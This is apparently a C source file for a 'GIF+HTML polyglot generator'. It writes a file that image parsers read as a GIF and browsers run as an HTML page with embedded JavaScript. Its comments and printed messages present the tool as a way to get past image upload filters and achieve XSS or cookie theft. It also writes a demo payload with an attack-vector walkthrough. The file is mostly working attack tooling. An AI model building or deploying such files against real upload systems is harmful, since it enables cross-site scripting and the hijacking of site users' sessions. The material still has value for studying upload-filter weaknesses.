/*
 * GIF+HTML Cross-Format Polyglot Generator
 * =========================================
 *
 * Creates files that are simultaneously:
 * - Valid GIF images (displays in browsers/viewers)
 * - Valid HTML pages (executes as web page)
 *
 * TECHNIQUE:
 * HTML browsers ignore unknown text before <!DOCTYPE> or <html> tags.
 * We embed a complete GIF image as "HTML comment" that browsers ignore,
 * but image parsers read as valid GIF.
 *
 * STRUCTURE:
 * ┌─────────────────────────────┐
 * │ GIF89a...<!--              │ ← Image viewers read this
 * ├─────────────────────────────┤
 * │ --><!DOCTYPE html>          │ ← Browsers start here
 * │ <html>                      │
 * │   <script>                  │
 * │     alert('Polyglot!');     │
 * │   </script>                 │
 * │ </html>                     │
 * └─────────────────────────────┘
 *
 * SECURITY IMPLICATIONS:
 * - Bypasses upload filters (looks like harmless image)
 * - Executes as HTML when directly accessed
 * - Can steal cookies, perform XSS, etc.
 *
 * USAGE:
 * ./gif_html_gen --html payload.html --output polyglot.gif
 *
 * Opens in:
 * - Image viewer → Shows GIF
 * - Web browser → Executes HTML/JavaScript
 *
 * COMPILE:
 * gcc -O2 -Wall -o gif_html_gen gif_html_polyglot.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define VERSION "1.0.0"

// Minimal 1x1 GIF with comment extension
const uint8_t GIF_HEADER_WITH_COMMENT[] = {
    // GIF89a signature
    'G', 'I', 'F', '8', '9', 'a',

    // Logical Screen Descriptor (1x1 image)
    0x01, 0x00,  // Width: 1
    0x01, 0x00,  // Height: 1
    0xF0,        // Global Color Table Flag=1, Color Resolution=7, Sort=0
    0x00,        // Background Color Index
    0x00,        // Pixel Aspect Ratio

    // Global Color Table (2 colors)
    0xFF, 0xFF, 0xFF,  // White
    0x00, 0x00, 0x00,  // Black

    // Comment Extension - This is where we hide the HTML transition
    0x21,        // Extension Introducer
    0xFE,        // Comment Label
};

int create_gif_html_polyglot(const char *html_file, const char *output_file) {
    printf("[*] GIF+HTML Polyglot Generator v%s\n", VERSION);
    printf("[*] Creating dual-format file...\n\n");

    // Read HTML payload
    FILE *html_fp = fopen(html_file, "rb");
    if (!html_fp) {
        perror("Error opening HTML file");
        return -1;
    }

    fseek(html_fp, 0, SEEK_END);
    size_t html_size = ftell(html_fp);
    fseek(html_fp, 0, SEEK_SET);

    char *html_content = malloc(html_size + 1);
    if (!html_content) {
        perror("malloc");
        fclose(html_fp);
        return -1;
    }

    fread(html_content, 1, html_size, html_fp);
    html_content[html_size] = '\0';
    fclose(html_fp);

    // Open output file
    FILE *out = fopen(output_file, "wb");
    if (!out) {
        perror("Error opening output file");
        free(html_content);
        return -1;
    }

    // Write GIF header with comment extension start
    fwrite(GIF_HEADER_WITH_COMMENT, 1, sizeof(GIF_HEADER_WITH_COMMENT), out);
    printf("[+] Wrote GIF header\n");

    // Write HTML comment start in GIF comment extension
    const char *html_comment_start = "<!--\n";
    uint8_t block_size = strlen(html_comment_start);
    fwrite(&block_size, 1, 1, out);
    fwrite(html_comment_start, 1, block_size, out);

    // GIF comment block terminator
    uint8_t term = 0x00;
    fwrite(&term, 1, 1, out);

    // Image Descriptor for 1x1 image
    uint8_t image_descriptor[] = {
        0x2C,        // Image Separator
        0x00, 0x00,  // Left: 0
        0x00, 0x00,  // Top: 0
        0x01, 0x00,  // Width: 1
        0x01, 0x00,  // Height: 1
        0x00         // No Local Color Table
    };
    fwrite(image_descriptor, 1, sizeof(image_descriptor), out);

    // LZW Minimum Code Size
    uint8_t lzw_min = 0x02;
    fwrite(&lzw_min, 1, 1, out);

    // Image Data (minimal LZW compressed 1x1 black pixel)
    uint8_t image_data[] = {
        0x02,        // Block size
        0x4C, 0x01,  // LZW compressed data
        0x00         // Block terminator
    };
    fwrite(image_data, 1, sizeof(image_data), out);

    // GIF Trailer
    uint8_t trailer = 0x3B;
    fwrite(&trailer, 1, 1, out);

    printf("[+] Completed GIF structure\n");

    // Now write the HTML content
    // Browsers will see this after the GIF binary data
    const char *html_transition = "\n-->\n";
    fwrite(html_transition, 1, strlen(html_transition), out);
    fwrite(html_content, 1, html_size, out);

    printf("[+] Embedded HTML content (%zu bytes)\n", html_size);

    fclose(out);
    free(html_content);

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  GIF+HTML Polyglot Created Successfully!                    ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("  File: %s\n\n", output_file);
    printf("  Test as GIF:\n");
    printf("    display %s\n", output_file);
    printf("    firefox file://%s  (shows as image)\n\n", output_file);
    printf("  Test as HTML:\n");
    printf("    firefox %s  (executes JavaScript!)\n", output_file);
    printf("    curl file://%s  (shows HTML source)\n\n", output_file);
    printf("  ⚠ WARNING: Can bypass upload filters!\n\n");

    return 0;
}

// Generate example malicious HTML
void create_example_html(const char *filename) {
    FILE *fp = fopen(filename, "w");
    if (!fp) return;

    fprintf(fp, "<!DOCTYPE html>\n");
    fprintf(fp, "<html>\n");
    fprintf(fp, "<head>\n");
    fprintf(fp, "  <title>GIF+HTML Polyglot Demo</title>\n");
    fprintf(fp, "</head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "  <h1>🎭 GIF+HTML Polyglot Demonstration</h1>\n");
    fprintf(fp, "  <p>This file is simultaneously:</p>\n");
    fprintf(fp, "  <ul>\n");
    fprintf(fp, "    <li>✅ A valid GIF image</li>\n");
    fprintf(fp, "    <li>✅ A valid HTML page</li>\n");
    fprintf(fp, "  </ul>\n");
    fprintf(fp, "  <script>\n");
    fprintf(fp, "    console.log('Polyglot JavaScript executed!');\n");
    fprintf(fp, "    alert('This GIF just executed JavaScript! 🚨');\n");
    fprintf(fp, "    \n");
    fprintf(fp, "    // Example malicious payload (DEMO ONLY):\n");
    fprintf(fp, "    // document.cookie → Cookie theft\n");
    fprintf(fp, "    // fetch('/api/data') → Data exfiltration\n");
    fprintf(fp, "    // window.location → Redirect\n");
    fprintf(fp, "  </script>\n");
    fprintf(fp, "  <p><strong>Attack Vector:</strong></p>\n");
    fprintf(fp, "  <ol>\n");
    fprintf(fp, "    <li>Upload as \"harmless GIF image\"</li>\n");
    fprintf(fp, "    <li>Filter sees GIF magic bytes → ✅ Allowed</li>\n");
    fprintf(fp, "    <li>Direct access executes HTML/JS → 💥 XSS</li>\n");
    fprintf(fp, "  </ol>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");

    fclose(fp);
    printf("[+] Created example HTML: %s\n", filename);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("GIF+HTML Cross-Format Polyglot Generator\n\n");
        printf("Usage: %s [OPTIONS]\n\n", argv[0]);
        printf("Options:\n");
        printf("  --html FILE       HTML file to embed\n");
        printf("  --output FILE     Output polyglot file (default: polyglot.gif)\n");
        printf("  --demo            Generate demo HTML payload\n\n");
        printf("Example:\n");
        printf("  %s --demo\n", argv[0]);
        printf("  %s --html payload.html --output evil.gif\n\n", argv[0]);
        printf("Creates a GIF that executes as HTML when opened!\n\n");
        printf("⚠ WARNING: Can bypass image upload filters and execute XSS!\n");
        return 1;
    }

    const char *html_file = NULL;
    const char *output = "polyglot.gif";
    int demo_mode = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--html") == 0 && i + 1 < argc) {
            html_file = argv[++i];
        } else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            output = argv[++i];
        } else if (strcmp(argv[i], "--demo") == 0) {
            demo_mode = 1;
        }
    }

    if (demo_mode) {
        const char *demo_html = "demo_payload.html";
        create_example_html(demo_html);
        printf("\n[*] Now run:\n");
        printf("    %s --html %s --output demo.gif\n", argv[0], demo_html);
        return 0;
    }

    if (!html_file) {
        fprintf(stderr, "Error: No HTML file specified\n");
        fprintf(stderr, "Use --demo to generate example, or --html to specify file\n");
        return 1;
    }

    return create_gif_html_polyglot(html_file, output);
}
